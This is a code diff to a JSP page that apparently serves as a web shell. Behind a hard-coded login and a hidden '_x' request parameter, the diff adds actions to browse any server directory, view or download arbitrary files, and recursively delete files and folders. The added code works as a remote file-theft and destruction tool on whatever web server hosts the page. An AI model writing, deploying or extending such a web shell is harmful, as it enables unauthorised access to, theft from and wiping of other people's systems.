@@ -8,10 +8,13 @@
 <%@ page import="javax.xml.transform.TransformerFactory" %>
 <%@ page import="javax.xml.transform.dom.DOMSource" %>
 <%@ page import="javax.xml.transform.stream.StreamResult" %>
+<%@ page import="java.io.File" %>
 <%@ page import="java.io.IOException" %>
-<%@ page import="java.util.HashMap" %>
-<%@ page import="java.util.List" %>
-<%@ page import="java.util.Map" %>
+<%@ page import="java.io.UnsupportedEncodingException" %>
+<%@ page import="java.net.URLEncoder" %>
+<%@ page import="java.nio.file.Files" %>
+<%@ page import="java.nio.file.Paths" %>
+<%@ page import="java.util.*" %>
 <%!
     public static final class Config {
         public static final String USER = "laohu";
@@ -52,7 +55,9 @@
             if (ret) {
                 //
                 internalRun();
-                output(code, message, data);
+                if (code > 0) {
+                    output(code, message, data);
+                }
             }
             return ret;
         }
@@ -64,9 +69,133 @@
                     return;
                 }
                 return;
+            } else {
+                code = 200;
+                message = "OK";
+                data.put("username", session.getAttribute("_user"));
+                data.put("pwd", getPWD());
+                data.put("breadcrumb", getBreadCrumb(getPWD()));
+            }
+
+            String action = getParam("_a", null);
+
+            if ("logout".equals(action)) {
+                session.invalidate();
+                code = 200;
+                message = "OK";
+                return;
+            }
+
+            if ("files".equals(action)) {
+                data.put("files", listFiles(getPWD()));
+                code = 200;
+                message = "OK";
+                return;
+            }
+
+            if ("view".equals(action) || "download".equals(action)) {
+                String path = getParam("path", null);
+                code = -1;
+                try {
+                    if (path == null) {
+                        out.println("No file specified.");
+                        return;
+                    }
+                    path = resovlePath(path);
+                    File file = new File(path);
+                    if (!file.exists() || file.isDirectory()) {
+                        out.println(String.format("\"%s\" is not a file.", path));
+                        return;
+                    }
+                    String contentType = getMimeType(file.getAbsolutePath());
+                    response.setContentType(contentType);
+                    response.setContentLengthLong(file.length());
+                    if ("download".equals(action) || contentType.startsWith("application/")) {
+                        response.setHeader("Content-Disposition", "attachment;filename=\"" + file.getName() + "\"");
+                    }
+                    out.clearBuffer();
+                    response.resetBuffer();
+                    Files.copy(Paths.get(file.getAbsolutePath()), response.getOutputStream());
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+
+                return;
+            }
+
+            if ("delete".equals(action)) {
+                String path = getParam("path", null);
+                if (path == null) {
+                    data.put("empty-path", "");
+                    code = 401;
+                    message = "Deletion failed.";
+                    return;
+                }
+                path = resovlePath(path);
+                File file = new File(path);
+                if (!file.exists()) {
+                    data.put("file-not-exists", "");
+                    code = 401;
+                    message = "Deletion failed.";
+                    return;
+                }
+                try {
+                    Stack<File> stack = new Stack<File>();
+                    stack.push(file);
+                    boolean ret = true;
+                    File[] currList = null;
+                    int fileCount = 0;
+                    int folderCount = 0;
+                    while (!stack.isEmpty()) {
+                        if (!ret) {
+                            break;
+                        }
+
+                        if (stack.lastElement().isDirectory()) {
+                            currList = stack.lastElement().listFiles();
+                            if (currList.length > 0) {
+                                for (File curr : currList) {
+                                    stack.push(curr);
+                                }
+                            } else {
+                                ret = stack.pop().delete() && ret;
+                                if (ret) {
+                                    ++ folderCount;
+                                }
+                            }
+                        } else {
+                            ret = ret && stack.pop().delete();
+                            if (ret) {
+                                ++ fileCount;
+                            }
+                        }
+                    }
+                    //boolean ret = file.delete();
+                    if (ret) {
+                        code = 200;
+                        message = "Deleteion success.";
+                        data.put("file-count", fileCount);
+                        data.put("dir-count", folderCount);
+                        return;
+                    }
+                    code = 401;
+                    message = "Deletion failed.";
+                    data.put("access-denied", "");
+                    return;
+                } catch (SecurityException e){
+                    code = 401;
+                    message = "Deletion failed.";
+                    data.put("access-denied", "");
+                    return;
+                }
             }
         }
 
+
+        public String resovlePath(String path) {
+            path = path.replaceFirst("^~", System.getProperty("user.home", "/"));
+            return path;
+        }
 
         public boolean shouldInShell() {
             if (getParam("_x", null) != null) {
@@ -78,6 +207,46 @@
         public String getParam(String name, String defaultValue) {
             String value = request.getParameter(name);
             return value == null ? defaultValue : value;
+        }
+
+        protected String getMimeType(String path) {
+            try {
+                Class.forName("javax.activation.MimetypesFileTypeMap");
+                javax.activation.MimetypesFileTypeMap map = new javax.activation.MimetypesFileTypeMap();
+                map.addMimeTypes("text/plain log LOG txt TXT md MD ini INI inf INF conf CONF");
+                map.addMimeTypes("text/javascript js JS json JSON");
+                map.addMimeTypes("text/css css CSS");
+                map.addMimeTypes("text/xml xml XML mxml MXML");
+                map.addMimeTypes("image/png png PNG");
+                map.addMimeTypes("image/tiff tiff TIFF");
+                return map.getContentType(path);
+            } catch (ClassNotFoundException e) {
+                // noop
+            }
+
+            try {
+                return Files.probeContentType(Paths.get(path));
+            } catch (IOException e) {
+                //e.printStackTrace();
+            }
+
+            return "application/octet-stream";
+        }
+
+        protected String getUrl(String action, String path) {
+            StringBuffer sb = request.getRequestURL();
+            sb.append("?_x=1&_a=");
+            try {
+                sb.append(URLEncoder.encode(action, "utf-8"));
+                sb.append("&path=");
+                sb.append(URLEncoder.encode(path, "utf-8"));
+            } catch (UnsupportedEncodingException e) {
+                //e.printStackTrace();
+                sb.append(action);
+                sb.append("&path=");
+                sb.append(path);
+            }
+            return sb.toString();
         }
 
         public boolean isLogined() {
@@ -111,6 +280,28 @@
             session.setAttribute(key, tryTime);
         }
 
+        protected List<HashMap<String, String>> getBreadCrumb(String path) {
+            ArrayList<HashMap<String, String>> filesList = new ArrayList<>();
+            File file = new File(path);
+            Stack<File> files = new Stack<>();
+            HashMap<String, String> fileInfo;
+            while (file != null) {
+                files.add(file);
+                file = file.getParentFile();
+            }
+            while (files.size() > 0) {
+                file = files.pop();
+                fileInfo = new HashMap<>();
+                fileInfo.put("name", file.getName());
+                if (file.getParentFile() == null) {
+                    fileInfo.put("name", "ROOT");
+                }
+                fileInfo.put("path", file.getAbsolutePath());
+                filesList.add(fileInfo);
+            }
+            return filesList;
+        }
+
         public void output(int code, String msg, Map<String, Object> data) {
             try {
                 response.resetBuffer();
@@ -138,10 +329,7 @@
                 DOMSource domSource = new DOMSource(doc);
                 StreamResult streamResult = new StreamResult(out);
                 transformer.transform(domSource, streamResult);
-            } catch (TransformerException e) {
-                e.printStackTrace();
-                return;
-            } catch (ParserConfigurationException e) {
+            } catch (TransformerException | ParserConfigurationException e) {
                 e.printStackTrace();
                 return;
             }
@@ -151,16 +339,19 @@
             Element element = doc.createElement(name);
             Class clazz = value.getClass();
             if (clazz.isArray()) {
+                element.setAttribute("type", "array");
                 Object[] items = (Object[]) value;
                 for (Object item : items) {
                     element.appendChild(createElement(doc, "item", item));
                 }
             } else if (List.class.isAssignableFrom(clazz)) {
+                element.setAttribute("type", "array");
                 List<Object> items = (List<Object>) value;
                 for (Object item : items) {
                     element.appendChild(createElement(doc, "item", item));
                 }
             } else if (Map.class.isAssignableFrom(clazz)) {
+                element.setAttribute("type", "map");
                 Map<Object, Object> map = (Map<Object, Object>) value;
                 for (Map.Entry entry : map.entrySet()) {
                     element.appendChild(createElement(doc, entry.getKey().toString(), entry.getValue()));
@@ -172,6 +363,7 @@
         }
 
         public void inDoLogin() {
+            //System.out.println("inLogin");
             String userName = getParam("userName", "").trim();
             String password = getParam("password", "").trim();
             if (userName.length() == 0 || password.length() == 0) {
@@ -214,6 +406,70 @@
             setTryTime(tryTime);
             data.put("max-try", Config.MAX_FAIL);
             data.put("block-wait", Config.BLOCKING_TIME);
+        }
+
+        protected ArrayList<HashMap<String, String>> listFiles(String path) {
+            ArrayList<HashMap<String, String>> files = new ArrayList<>();
+            File dir = new File(path);
+            HashMap<String, String> fileInfo = null;
+            ArrayList<File> filesList = new ArrayList<>();
+            if (dir.isDirectory()) {
+                filesList.add(dir);
+            }
+            if (dir.getParentFile() != null) {
+                filesList.add(dir.getParentFile());
+            }
+            File[] list = dir.listFiles();
+            if (list != null) {
+                filesList.addAll(Arrays.asList(list));
+            }
+
+            for (File file : filesList) {
+                fileInfo = new HashMap<>();
+                fileInfo.put("name", file.getName());
+                if (file.equals(dir)) {
+                    fileInfo.put("name", ".");
+                }
+                if (file.equals(dir.getParentFile())) {
+                    fileInfo.put("name", "..");
+                }
+                fileInfo.put("path", file.getAbsolutePath());
+                fileInfo.put("size", String.valueOf(file.length()));
+                fileInfo.put("download_url", getUrl("download", file.getAbsolutePath()));
+                fileInfo.put("view_url", getUrl("view", file.getAbsolutePath()));
+                fileInfo.put("delete_url", getUrl("delete", file.getAbsolutePath()));
+                fileInfo.put("type", file.isDirectory() ? "dir" : "file");
+                char[] perm = new char[]{'r', 'w', 'x'};
+                if (!file.canRead()) {
+                    perm[0] = '-';
+                }
+                if (!file.canWrite()) {
+                    perm[1] = '-';
+                }
+                if (!file.canExecute()) {
+                    perm[2] = '-';
+                }
+                fileInfo.put("perm", String.valueOf(perm));
+                files.add(fileInfo);
+            }
+
+            return files;
+        }
+
+        protected String getPWD() {
+            String path = System.getProperty("user.dir", "/");
+            path = getParam("path", path);
+            //System.out.println(System.getProperty("user.home"));
+            path = resovlePath(path);
+            File file = Paths.get(path).toFile().getAbsoluteFile();
+            while (!file.isDirectory() || !file.exists()) {
+                file = file.getParentFile();
+            }
+            if (file != null) {
+                path = file.getAbsolutePath();
+            }
+            //Runtime.getRuntime().
+            return path;
         }
     }
 
